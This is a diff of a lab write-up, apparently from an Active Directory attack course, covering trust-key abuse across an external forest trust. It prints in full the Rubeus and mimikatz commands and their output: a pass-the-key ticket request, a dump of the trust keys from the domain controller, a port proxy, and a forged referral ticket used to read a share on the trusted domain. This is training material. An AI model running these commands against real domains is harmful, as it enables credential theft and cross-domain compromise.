@@ -1,4 +1,4 @@
-# Learning Objective 20
+# Learning Objective 20 (Privilege Escalation | Across External Trusts - Trust Key Abuse)
 
 ## Tasks
 
@@ -14,11 +14,13 @@
 
 We need the trust key for the trust between `dollarcorp` and `eurocrop`, which can be retrieved using Mimikatz or SafetyKatz.
 
-Start a process with DA privileges. Run the below command **from an elevated command prompt**.
+Start a process with DA privileges.
+
+Run the below command **from an elevated command prompt**.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -51,7 +53,7 @@ Start a process with DA privileges. Run the below command **from an elevated com
 [+] Ticket successfully imported!🎟️
 
   ServiceName              :  krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL
-  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
+  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
   UserName                 :  svcadmin🎭 (NT_PRINCIPAL)
   UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
   StartTime                :  2/17/2025 6:28:33 AM
@@ -65,9 +67,7 @@ Start a process with DA privileges. Run the below command **from an elevated com
 
 ![New spawned terminal process](./assets/screenshots/learning_objective_20_new_spawned_terminal_process.png)
 
-Run the below commands from the process running as DA to copy `Loader.exe` on `dcorp-dc` and use it to extract credentials.
-
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `klist`:
 ```
@@ -87,6 +87,8 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
+Run the below commands from the process running as DA to copy `Loader.exe` on `dcorp-dc` and use it to extract credentials.
+
 `echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y`:
 ```
 C:\AD\Tools\Loader.exe
@@ -102,7 +104,7 @@ C:\Users\svcadmin>
 ```
 🚀
 
-![Victim: dcorp-dc | svcadmin](https://custom-icon-badges.demolab.com/badge/dcorp--dc-svcadmin-64b5f6?logo=windows11&logoColor=white)
+![dcorp-dc | svcadmin](https://custom-icon-badges.demolab.com/badge/dcorp--dc-svcadmin-64b5f6?logo=windows11&logoColor=white)
 
 `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`
 
@@ -112,14 +114,14 @@ C:\Users\svcadmin>
 ```
 [SNIP]
 
-mimikatz(commandline) # lsadump::evasive-trust /patch
+mimikatz(commandline) # lsadump::evasive-trust /patch📌
 
 Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)
 
 [SNIP]
 
-Domain: EUROCORP.LOCAL📌 (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
- [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL📌
+Domain: EUROCORP.LOCAL🏛️ (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
+ [  In ]📌 DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL🏛️
     * 2/16/2025 9:16:51 PM - CLEAR   - 14 fd 45 3b db 06 1d cf 60 b1 6c 8f 7f 73 48 65 00 f9 64 2b 24 fe a5 8e 87 64 37 77
         * aes256_hmac       58d399736f8be2c9efa51372ffd06ba9e5c36afd97a9161ea4bafc5d0f1dce8b
         * aes128_hmac       80d9ea04b9e7031892cc39335a390883
@@ -130,9 +132,9 @@ Domain: EUROCORP.LOCAL📌 (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
 
 **Forge a referral ticket**
 
-Let’s forge a referral ticket. Note that we are not injecting any SID History here as it would be filtered out. Run the below command.
+Let's forge a referral ticket. Note that **we are not injecting any SID History here** as it would be filtered out. Run the below command.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:8b47def37766600c86a9ce817a3fadf4 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap`:
 ```
@@ -165,8 +167,8 @@ Let’s forge a referral ticket. Note that we are not injecting any SID History 
 
 [*] Building PAC
 
-[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
-[*] SID            : S-1-5-21-719815819-3726368948-3917688648
+[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL🏛️ (dcorp)
+[*] SID            : S-1-5-21-719815819-3726368948-3917688648📌
 [*] UserId         : 500
 [*] Groups         : 544,512,520,513
 [*] ServiceKey     : 8B47DEF37766600C86A9CE817A3FADF4
@@ -181,7 +183,7 @@ Let’s forge a referral ticket. Note that we are not injecting any SID History 
 [*] Encrypting EncTicketPart
 [*] Generating Ticket
 [*] Generated KERB-CRED
-[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local'
+[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'
 
 [*] AuthTime       : 2/17/2025 6:39:56 AM
 [*] StartTime      : 2/17/2025 6:39:56 AM
@@ -209,9 +211,9 @@ Copy the base64 encoded ticket from above and use it in the following command.
 [*] base64(ticket.kirbi):
 
   ServiceName              :  cifs📌/eurocorp-dc.eurocorp.LOCAL
-  ServiceRealm             :  EUROCORP.LOCAL📌
+  ServiceRealm             :  EUROCORP.LOCAL🏛️
   UserName                 :  Administrator🎭 (NT_PRINCIPAL)
-  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL📌
+  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL🏛️
   StartTime                :  2/17/2025 6:41:55 AM
   EndTime                  :  2/17/2025 4:39:56 PM
   RenewTill                :  2/24/2025 6:39:56 AM
@@ -226,8 +228,8 @@ Current LogonId is 0:0x38c010
 
 Cached Tickets: (1)
 
-#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL📌
-        Server: cifs📌/eurocorp-dc.eurocorp.LOCAL @ EUROCORP.LOCAL📌
+#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
+        Server: cifs📌/eurocorp-dc.eurocorp.LOCAL @ EUROCORP.LOCAL🏛️
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
         Start Time: 2/17/2025 6:41:55 (local)
@@ -247,7 +249,7 @@ Once the ticket is injected, we can access explicitly shared resources on `euroc
  Volume in drive \\eurocorp-dc.eurocorp.local\SharedwithDCorp has no label.
  Volume Serial Number is 1A5A-FDE2
 
- Directory of \\eurocorp-dc.eurocorp.local\SharedwithDCorp
+ Directory of \\eurocorp-dc.eurocorp.local\SharedwithDCorp📁
 
 11/16/2022  04:26 AM    <DIR>          .
 11/15/2022  06:17 AM                29 secret.txt
@@ -257,7 +259,7 @@ Once the ticket is injected, we can access explicitly shared resources on `euroc
 
 `type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt`:
 ```
-Dollarcorp DAs can read this!
+Dollarcorp DAs can read this!📌
 ```
 🚩
 
